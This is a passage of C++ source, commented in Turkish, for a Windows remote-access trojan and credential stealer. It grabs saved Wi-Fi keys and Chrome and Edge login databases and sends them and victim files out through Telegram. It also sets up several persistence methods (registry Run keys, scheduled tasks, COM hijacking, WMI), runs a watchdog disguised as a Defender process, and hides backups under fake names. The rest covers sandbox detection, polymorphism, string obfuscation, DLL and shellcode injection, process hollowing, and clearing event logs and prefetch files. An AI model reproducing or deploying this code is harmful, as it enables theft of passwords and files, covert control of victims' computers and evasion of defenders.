    std::string keyCmd = "netsh wlan show profile name=\"" + profile +
                         "\" key=clear > \"" + tempFile + "\"";
    ExecCommand(keyCmd);

    std::ifstream keyFile(tempFile);
    std::string password;

    while (std::getline(keyFile, line)) {
      if (line.find("Key Content") != std::string::npos ||
          line.find("Anahtar") != std::string::npos) {
        size_t pos = line.find(": ");
        if (pos != std::string::npos) {
          password = line.substr(pos + 2);
          while (!password.empty() &&
                 (password.back() == '\r' || password.back() == '\n'))
            password.pop_back();
        }
      }
    }
    keyFile.close();
    DeleteFileA(tempFile);

    if (!password.empty()) {
      result << "🔑 `" << profile << "`: `" << password << "`\n";
    } else {
      result << "🔒 `" << profile << "`: (yok)\n";
    }
  }

  SendTelegramMessage(result.str());
}

// ==================== FAZ 3: BROWSER PASSWORDS ====================
void GetBrowserPasswords() {
  std::stringstream result;
  result << "🔐 *Tarayici Verileri*\n\n";

  // Chrome/Edge Login Data konumlari
  char localAppData[MAX_PATH];
  SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);

  std::string chromePath = std::string(localAppData) +
                           "\\Google\\Chrome\\User Data\\Default\\Login Data";
  std::string edgePath = std::string(localAppData) +
                         "\\Microsoft\\Edge\\User Data\\Default\\Login Data";

  int count = 0;

  // Chrome
  if (GetFileAttributesA(chromePath.c_str()) != INVALID_FILE_ATTRIBUTES) {
    result << "*Chrome:*\n";

    // Veritabanini kopyala
    std::string tempDb = g_tempFolder + "\\chrome_ld.db";
    CopyFileA(chromePath.c_str(), tempDb.c_str(), FALSE);

    // Basit URL cikarma (SQLite olmadan)
    std::ifstream file(tempDb, std::ios::binary);
    if (file) {
      std::vector<char> data((std::istreambuf_iterator<char>(file)),
                             std::istreambuf_iterator<char>());
      file.close();

      std::string content(data.begin(), data.end());
      size_t pos = 0;
      int urlCount = 0;

      while ((pos = content.find("http", pos)) != std::string::npos &&
             urlCount < 10) {
        size_t end = pos;
        while (end < content.length() && content[end] > 31 &&
               content[end] < 127 && content[end] != ' ')
          end++;

        std::string url = content.substr(pos, std::min(end - pos, (size_t)80));
        if (url.find(".") != std::string::npos && url.length() > 10) {
          result << "🌐 `"
                 << (url.length() > 50 ? url.substr(0, 50) + "..." : url)
                 << "`\n";
          urlCount++;
          count++;
        }
        pos = end + 1;
      }

      DeleteFileA(tempDb.c_str());
    }
  }

  // Edge
  if (GetFileAttributesA(edgePath.c_str()) != INVALID_FILE_ATTRIBUTES) {
    result << "\n*Edge:*\n";

    std::string tempDb = g_tempFolder + "\\edge_ld.db";
    CopyFileA(edgePath.c_str(), tempDb.c_str(), FALSE);

    std::ifstream file(tempDb, std::ios::binary);
    if (file) {
      std::vector<char> data((std::istreambuf_iterator<char>(file)),
                             std::istreambuf_iterator<char>());
      file.close();

      std::string content(data.begin(), data.end());
      size_t pos = 0;
      int urlCount = 0;

      while ((pos = content.find("http", pos)) != std::string::npos &&
             urlCount < 10) {
        size_t end = pos;
        while (end < content.length() && content[end] > 31 &&
               content[end] < 127 && content[end] != ' ')
          end++;

        std::string url = content.substr(pos, std::min(end - pos, (size_t)80));
        if (url.find(".") != std::string::npos && url.length() > 10) {
          result << "🌐 `"
                 << (url.length() > 50 ? url.substr(0, 50) + "..." : url)
                 << "`\n";
          urlCount++;
          count++;
        }
        pos = end + 1;
      }

      DeleteFileA(tempDb.c_str());
    }
  }

  if (count == 0) {
    result << "Veri bulunamadi veya tarayici acik.\n";
  } else {
    result << "\n⚠️ _Sifreler DPAPI ile sifrelidir_\n";
  }

  SendTelegramMessage(result.str());
}

// ==================== FAZ 3: DOSYA INDIRME ====================
void DownloadFile(const std::string &path) {
  std::string cleanPath = path;
  // Trim
  while (!cleanPath.empty() && (cleanPath.front() == ' '))
    cleanPath.erase(0, 1);
  while (!cleanPath.empty() &&
         (cleanPath.back() == ' ' || cleanPath.back() == '\r' ||
          cleanPath.back() == '\n'))
    cleanPath.pop_back();

  DWORD attrs = GetFileAttributesA(cleanPath.c_str());

  if (attrs == INVALID_FILE_ATTRIBUTES) {
    SendTelegramMessage("❌ Dosya bulunamadi: " + cleanPath);
    return;
  }

  // Klasor mu?
  if (attrs & FILE_ATTRIBUTE_DIRECTORY) {
    std::stringstream result;
    result << "📁 *" << cleanPath << "*\n\n";

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA((cleanPath + "\\*").c_str(), &fd);

    if (hFind != INVALID_HANDLE_VALUE) {
      int count = 0;
      do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
          continue;

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
          result << "📂 `" << fd.cFileName << "/`\n";
        } else {
          ULARGE_INTEGER fileSize;
          fileSize.LowPart = fd.nFileSizeLow;
          fileSize.HighPart = fd.nFileSizeHigh;
          result << "`" << fd.cFileName << "` (" << (fileSize.QuadPart / 1024)
                 << " KB)\n";
        }
        count++;
        if (count >= 30) {
          result << "...\n";
          break;
        }
      } while (FindNextFileA(hFind, &fd));
      FindClose(hFind);
    }

    SendTelegramMessage(result.str());
  } else {
    // Dosya - boyut kontrol
    HANDLE hFile = CreateFileA(cleanPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
      SendTelegramMessage("❌ Dosya acilamadi: " + cleanPath);
      return;
    }

    LARGE_INTEGER fileSize;
    GetFileSizeEx(hFile, &fileSize);
    CloseHandle(hFile);

    if (fileSize.QuadPart > 50 * 1024 * 1024) {
      SendTelegramMessage("❌ Dosya cok buyuk: " +
                          std::to_string(fileSize.QuadPart / (1024 * 1024)) +
                          " MB (max 50MB)");
      return;
    }

    std::string filename = cleanPath.substr(cleanPath.find_last_of("\\/") + 1);
    SendTelegramDocument(cleanPath,
                         "📁 " + filename + " (" +
                             std::to_string(fileSize.QuadPart / 1024) + " KB)");
  }
}

// ==================== FAZ 4: WATCHDOG ====================
void StartWatchdog() {
  // Watchdog process'i ayri olarak baslat
  char currentPath[MAX_PATH];
  GetModuleFileNameA(NULL, currentPath, MAX_PATH);

  // Watchdog icin farkli isim
  char appData[MAX_PATH];
  SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appData);
  std::string watchdogDir =
      std::string(appData) + "\\Microsoft\\WindowsApps\\Defender";
  std::string watchdogPath = watchdogDir + "\\MsMpEng.exe";

  CreateDirectoryA(watchdogDir.c_str(), NULL);
  CopyFileA(currentPath, watchdogPath.c_str(), FALSE);
  SetFileAttributesA(watchdogPath.c_str(),
                     FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

  // Watchdog'u baslat
  std::string cmdLine = "\"" + watchdogPath + "\" -watchdog";

  STARTUPINFOA si = {sizeof(si)};
  si.dwFlags = STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE;
  PROCESS_INFORMATION pi;

  CreateProcessA(NULL, (LPSTR)cmdLine.c_str(), NULL, NULL, FALSE,
                 CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
  CloseHandle(pi.hProcess);
  CloseHandle(pi.hThread);
}

void WatchdogLoop() {
  HideConsole();

  while (true) {
    Sleep(10000);

    // Ana surecin calisip calismadigini kontrol et
    bool mainRunning = false;

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
      PROCESSENTRY32 pe;
      pe.dwSize = sizeof(pe);

      if (Process32First(hSnap, &pe)) {
        do {
          // Ana process OneDriveUpdater.exe olarak saklanıyor (HideInSystem ile uyumlu)
          if (_stricmp(pe.szExeFile, "OneDriveUpdater.exe") == 0) {
            mainRunning = true;
            break;
          }
        } while (Process32Next(hSnap, &pe));
      }
      CloseHandle(hSnap);
    }

    // Ana surec calismiyorsa yeniden baslat
    if (!mainRunning) {
      RestoreSelf();
    }
  }
}

// ==================== FAZ 4: MULTI-PERSISTENCE ====================
void MultiPersistence() {
  // 1. Registry Run
  HKEY hKey;
  if (RegOpenKeyExA(HKEY_CURRENT_USER,
                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
                    KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
    // HideInSystem ile uyumlu: OneDriveUpdate
    RegSetValueExA(hKey, "OneDriveUpdate", 0, REG_SZ,
                   (BYTE *)g_hiddenPath.c_str(), g_hiddenPath.length() + 1);
    RegCloseKey(hKey);
  }

  // 2. Registry RunOnce
  if (RegOpenKeyExA(HKEY_CURRENT_USER,
                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0,
                    KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
    std::string cmd = "\"" + g_hiddenPath + "\"";
    RegSetValueExA(hKey, "SecurityUpdate", 0, REG_SZ, (BYTE *)cmd.c_str(),
                   cmd.length() + 1);
    RegCloseKey(hKey);
  }

  // 3. Startup folder
  char startupPath[MAX_PATH];
  SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath);
  // HideInSystem ile uyumlu: OneDriveUpdater
  std::string lnkPath =
      std::string(startupPath) + "\\OneDriveUpdater.lnk";

  // Basit shortcut (vbs ile)
  std::string vbsPath = g_tempFolder + "\\createlink.vbs";
  std::ofstream vbs(vbsPath);
  vbs << "Set ws = WScript.CreateObject(\"WScript.Shell\")\n";
  vbs << "Set sc = ws.CreateShortcut(\"" << lnkPath << "\")\n";
  vbs << "sc.TargetPath = \"" << g_hiddenPath << "\"\n";
  vbs << "sc.WindowStyle = 7\n";
  vbs << "sc.Save\n";
  vbs.close();

  std::string cmd = "wscript.exe /nologo \"" + vbsPath + "\"";
  ExecCommand(cmd);
  DeleteFileA(vbsPath.c_str());

  // 4. Task Scheduler - HideInSystem ile uyumlu: OneDrive path kullanılıyor
  std::string taskCmd =
      "schtasks /create /tn \"Microsoft\\OneDrive\\Update\" /tr \"" + g_hiddenPath +
      "\" /sc onlogon /rl highest /f >nul 2>&1";
  ExecCommand(taskCmd);

  // ==================== ADVANCED PERSISTENCE ====================
  // 5. COM Hijacking (user-level, triggers on audio/browser use)
  InstallCOMHijack();

  // 6. WMI Event Subscription (admin may be required)
  InstallWMISubscription();

  // 7. Additional Scheduled Task with different trigger
  InstallScheduledTask();
}

// ==================== FAZ 4: SELF-PROTECTION ====================
void BackupSelf() {
  char currentPath[MAX_PATH];
  GetModuleFileNameA(NULL, currentPath, MAX_PATH);

  // Birden fazla yedek konum
  char appData[MAX_PATH];
  SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appData);

  std::vector<std::string> backupPaths;
  backupPaths.push_back(std::string(appData) +
                        "\\Microsoft\\Windows\\Fonts\\fontcache.bin");
  backupPaths.push_back(std::string(appData) +
                        "\\Microsoft\\CLR_v4.0\\UsageData.dat");
  backupPaths.push_back(std::string(appData) +
                        "\\Microsoft\\Windows\\INetCache\\update.exe");

  for (const auto &path : backupPaths) {
    // Klasoru olustur
    std::string dir = path.substr(0, path.find_last_of("\\/"));
    CreateDirectoryA(dir.c_str(), NULL);

    // Kopyala ve gizle
    if (CopyFileA(currentPath, path.c_str(), FALSE)) {
      SetFileAttributesA(path.c_str(),
                         FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
      g_backupPath = path;
    }
  }
}

void RestoreSelf() {
  // Backup'tan geri yukle
  char appData[MAX_PATH];
  SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appData);

  std::vector<std::string> backupPaths;
  backupPaths.push_back(std::string(appData) +
                        "\\Microsoft\\Windows\\Fonts\\fontcache.bin");
  backupPaths.push_back(std::string(appData) +
                        "\\Microsoft\\CLR_v4.0\\UsageData.dat");
  backupPaths.push_back(std::string(appData) +
                        "\\Microsoft\\Windows\\INetCache\\update.exe");

  std::string targetDir =
      std::string(appData) + "\\Microsoft\\OneDrive\\Update";
  std::string targetPath = targetDir + "\\OneDriveUpdater.exe";

  for (const auto &backup : backupPaths) {
    if (GetFileAttributesA(backup.c_str()) != INVALID_FILE_ATTRIBUTES) {
      CreateDirectoryA(targetDir.c_str(), NULL);
      CopyFileA(backup.c_str(), targetPath.c_str(), FALSE);

      // Baslat
      STARTUPINFOA si = {sizeof(si)};
      si.dwFlags = STARTF_USESHOWWINDOW;
      si.wShowWindow = SW_HIDE;
      PROCESS_INFORMATION pi;

      if (CreateProcessA(targetPath.c_str(), NULL, NULL, NULL, FALSE,
                         CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
      }
    }
  }
}

void SelfProtection() {
  // Anti-kill: Surecin sonlandirilmasini zorlaştır
  // (User-mode'da sinirli, kernel-mode gerektirir)
}

// ==================== FAZ 5: GELISMIS SANDBOX DETECTION ====================
bool AdvancedSandboxDetection() {
  int suspiciousScore = 0;

  // 1. Mouse hareketi kontrolu (daha uzun bekleme)
  POINT pt1, pt2;
  GetCursorPos(&pt1);
  Sleep(200);
  GetCursorPos(&pt2);
  if (pt1.x == pt2.x && pt1.y == pt2.y) {
    suspiciousScore++; // Sadece 1 puan
  }

  // 2. Desktop dosya sayisi (daha düşük eşik)
  char desktopPath[MAX_PATH];
  SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath);

  WIN32_FIND_DATAA fd;
  HANDLE hFind =
      FindFirstFileA((std::string(desktopPath) + "\\*").c_str(), &fd);
  int desktopFiles = 0;
  if (hFind != INVALID_HANDLE_VALUE) {
    do {
      desktopFiles++;
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);
  }
  if (desktopFiles < 3) // Daha düşük eşik
    suspiciousScore++;

  // 3. Recent documents (daha düşük eşik)
  char recentPath[MAX_PATH];
  SHGetFolderPathA(NULL, CSIDL_RECENT, NULL, 0, recentPath);
  hFind = FindFirstFileA((std::string(recentPath) + "\\*").c_str(), &fd);
  int recentFiles = 0;
  if (hFind != INVALID_HANDLE_VALUE) {
    do {
      recentFiles++;
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);
  }
  if (recentFiles < 5) // Daha düşük eşik
    suspiciousScore++;

  // 4. Uptime kontrolu - DEVRE DIŞI (çok fazla false positive)
  // DWORD uptime = GetTickCount();
  // if (uptime < 60 * 60 * 1000) suspiciousScore++;

  // 5. Sadece çok şüpheli isimler (yaygın isimler çıkarıldı)
  char username[256], hostname[256];
  DWORD size = sizeof(username);
  GetUserNameA(username, &size);
  size = sizeof(hostname);
  GetComputerNameA(hostname, &size);

  std::string user(username), host(hostname);
  std::transform(user.begin(), user.end(), user.begin(), ::tolower);
  std::transform(host.begin(), host.end(), host.begin(), ::tolower);

  // Sadece gerçek sandbox isimleri
  const char *suspiciousNames[] = {"sandbox", "virus",   "malware",
                                   "sample",  "analyst", "cuckoo",
                                   "vmware",  "vbox",    "virtual"};
  for (const auto &name : suspiciousNames) {
    if (user.find(name) != std::string::npos ||
        host.find(name) != std::string::npos) {
      suspiciousScore += 2; // Çok şüpheli
    }
  }

  // En az 3 puan gerekli (daha önce tek kontrol yeterliydi)
  return suspiciousScore >= 3;
}

// ==================== FAZ 5: POLIMORFIK KOD ====================
void MakePolymorphic() {
  char currentPath[MAX_PATH];
  GetModuleFileNameA(NULL, currentPath, MAX_PATH);

  // Dosyayi oku
  std::ifstream file(currentPath, std::ios::binary);
  if (!file)
    return;

  std::vector<char> data((std::istreambuf_iterator<char>(file)),
                         std::istreambuf_iterator<char>());
  file.close();

  // Marker: ##POLY##
  const char *marker = "##POLY##";
  std::string dataStr(data.begin(), data.end());
  size_t markerPos = dataStr.find(marker);

  // Eski junk'i kaldir
  if (markerPos != std::string::npos) {
    data.resize(markerPos);
  }

  // Yeni junk ekle
  srand((unsigned)time(NULL));
  int junkSize = 100 + (rand() % 900);

  std::vector<char> newData = data;
  for (int i = 0; i < 8; i++)
    newData.push_back(marker[i]);
  for (int i = 0; i < junkSize; i++)
    newData.push_back((char)(rand() % 256));

  // Gizli konuma yaz
  if (!g_hiddenPath.empty() &&
      GetFileAttributesA(g_hiddenPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
    SetFileAttributesA(g_hiddenPath.c_str(), FILE_ATTRIBUTE_NORMAL);

    std::ofstream out(g_hiddenPath, std::ios::binary);
    if (out) {
      out.write(newData.data(), newData.size());
      out.close();
    }

    SetFileAttributesA(g_hiddenPath.c_str(),
                       FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
  }
}

// ==================== FAZ 5: INTEGRITY CHECK ====================
bool CheckIntegrity() {
  char currentPath[MAX_PATH];
  GetModuleFileNameA(NULL, currentPath, MAX_PATH);

  HANDLE hFile = CreateFileA(currentPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                             OPEN_EXISTING, 0, NULL);
  if (hFile == INVALID_HANDLE_VALUE)
    return true;

  LARGE_INTEGER fileSize;
  GetFileSizeEx(hFile, &fileSize);
  CloseHandle(hFile);

  // Minimum boyut kontrolu (cok kucukse kurcalanmis)
  if (fileSize.QuadPart < 50000)
    return false;

  return true;
}

// ==================== FAZ 5: STRING OBFUSCATION ====================
std::string Obfuscate(const std::string &str) {
  std::string result = str;
  for (size_t i = 0; i < result.length(); i++) {
    result[i] ^= XOR_KEY[i % XOR_KEY.length()];
  }

  // Base64 encode (basit)
  const char *base64 =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  std::string encoded;

  for (size_t i = 0; i < result.length(); i += 3) {
    int val = (result[i] & 0xFF) << 16;
    if (i + 1 < result.length())
      val |= (result[i + 1] & 0xFF) << 8;
    if (i + 2 < result.length())
      val |= (result[i + 2] & 0xFF);

    encoded += base64[(val >> 18) & 0x3F];
    encoded += base64[(val >> 12) & 0x3F];
    encoded += (i + 1 < result.length()) ? base64[(val >> 6) & 0x3F] : '=';
    encoded += (i + 2 < result.length()) ? base64[val & 0x3F] : '=';
  }

  return encoded;
}

std::string Deobfuscate(const std::string &str) {
  // Base64 decode (basit)
  std::vector<int> T(256, -1);
  for (int i = 0; i < 64; i++) {
    T["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i]] =
        i;
  }

  std::string decoded;
  int val = 0, bits = -8;

  for (char c : str) {
    if (T[c] == -1)
      break;
    val = (val << 6) + T[c];
    bits += 6;
    if (bits >= 0) {
      decoded += char((val >> bits) & 0xFF);
      bits -= 8;
    }
  }

  // XOR decode
  for (size_t i = 0; i < decoded.length(); i++) {
    decoded[i] ^= XOR_KEY[i % XOR_KEY.length()];
  }

  return decoded;
}

// ==================== FAZ 5: RANDOM DELAY ====================
void RandomDelay() {
  srand((unsigned)time(NULL) + GetCurrentProcessId());
  int delay = 100 + (rand() % 2000);
  Sleep(delay);
}

// ==================== FAZ 6: DLL INJECTION ====================
bool InjectDLL(DWORD pid, const char *dllPath) {
  HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
  if (!hProcess)
    return false;

  // DLL path icin bellek ayir
  size_t pathLen = strlen(dllPath) + 1;
  LPVOID remotePath = VirtualAllocEx(hProcess, NULL, pathLen,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!remotePath) {
    CloseHandle(hProcess);
    return false;
  }

  // DLL path'i yaz
  WriteProcessMemory(hProcess, remotePath, dllPath, pathLen, NULL);

  // LoadLibraryA adresini al
  HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
  LPTHREAD_START_ROUTINE loadLibAddr =
      (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");

  // Remote thread olustur
  HANDLE hThread =
      CreateRemoteThread(hProcess, NULL, 0, loadLibAddr, remotePath, 0, NULL);
  if (!hThread) {
    VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return false;
  }

  WaitForSingleObject(hThread, 5000);

  VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
  CloseHandle(hThread);
  CloseHandle(hProcess);

  return true;
}

// ==================== FAZ 6: SHELLCODE INJECTION ====================
bool InjectShellcode(DWORD pid) {
  HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
  if (!hProcess)
    return false;

  // Basit shellcode - MessageBox (ornek)
  // Gercek kullanim icin ozel shellcode olusturulmali
  unsigned char shellcode[] = {
      0x90, 0x90, 0x90, 0x90, // NOP sled
      0xC3                    // RET
  };

  // Bellek ayir
  LPVOID remoteShellcode =
      VirtualAllocEx(hProcess, NULL, sizeof(shellcode),
                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

  if (!remoteShellcode) {
    CloseHandle(hProcess);
    return false;
  }

  // Shellcode yaz
  WriteProcessMemory(hProcess, remoteShellcode, shellcode, sizeof(shellcode),
                     NULL);

  // Thread olustur ve calistir
  HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                      (LPTHREAD_START_ROUTINE)remoteShellcode,
                                      NULL, 0, NULL);

  if (!hThread) {
    VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return false;
  }

  WaitForSingleObject(hThread, 5000);

  VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
  CloseHandle(hThread);
  CloseHandle(hProcess);

  return true;
}

// ==================== FAZ 6: FIND TARGET PROCESS ====================
DWORD FindTargetProcess(const char *processName) {
  HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (hSnap == INVALID_HANDLE_VALUE)
    return 0;

  PROCESSENTRY32 pe;
  pe.dwSize = sizeof(pe);

  if (Process32First(hSnap, &pe)) {
    do {
      if (_stricmp(pe.szExeFile, processName) == 0) {
        CloseHandle(hSnap);
        return pe.th32ProcessID;
      }
    } while (Process32Next(hSnap, &pe));
  }

  CloseHandle(hSnap);
  return 0;
}

// ==================== FAZ 6: RUN AS LEGIT PROCESS ====================
bool RunAsLegitProcess() {
  char currentPath[MAX_PATH];
  GetModuleFileNameA(NULL, currentPath, MAX_PATH);

  // Hedef isimler (meşru Windows süreçleri)
  const char *legitNames[] = {"svchost.exe", "RuntimeBroker.exe", "conhost.exe",
                              "dllhost.exe"};

  // Rastgele sec
  srand((unsigned)time(NULL));
  int idx = rand() % 4;

  char systemPath[MAX_PATH];
  GetSystemDirectoryA(systemPath, MAX_PATH);
  std::string targetPath = std::string(systemPath) + "\\" + legitNames[idx];

  // Hedef process mevcut mu?
  if (GetFileAttributesA(targetPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
    targetPath = std::string(systemPath) + "\\notepad.exe";
  }

  // Process Hollowing dene
  return ProcessHollow(targetPath.c_str(), currentPath);
}

// ==================== FAZ 6: ANTI-FORENSICS ====================
void ClearEventLogs() {
  // Windows Event Log'lari temizle
  ExecCommand("wevtutil cl Application >nul 2>&1");
  ExecCommand("wevtutil cl Security >nul 2>&1");
  ExecCommand("wevtutil cl System >nul 2>&1");
}

void DeletePrefetch() {
  // Prefetch dosyalarini temizle
  char windowsPath[MAX_PATH];
  GetWindowsDirectoryA(windowsPath, MAX_PATH);
  std::string prefetchPath = std::string(windowsPath) + "\\Prefetch\\*.pf";

  WIN32_FIND_DATAA fd;
  HANDLE hFind = FindFirstFileA(prefetchPath.c_str(), &fd);
  if (hFind != INVALID_HANDLE_VALUE) {
    do {
      std::string fullPath =
          std::string(windowsPath) + "\\Prefetch\\" + fd.cFileName;
      DeleteFileA(fullPath.c_str());
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);
  }
}

void SecureDelete(const std::string &path) {
  // Dosyayi silmeden once uzerine yaz
  HANDLE hFile =
      CreateFileA(path.c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
  if (hFile != INVALID_HANDLE_VALUE) {
    LARGE_INTEGER fileSize;
    if (GetFileSizeEx(hFile, &fileSize)) {
      std::vector<char> zeros(fileSize.LowPart, 0);
      DWORD written;
      SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
      WriteFile(hFile, zeros.data(), zeros.size(), &written, NULL);
    }
    CloseHandle(hFile);
  }
  DeleteFileA(path.c_str());
}
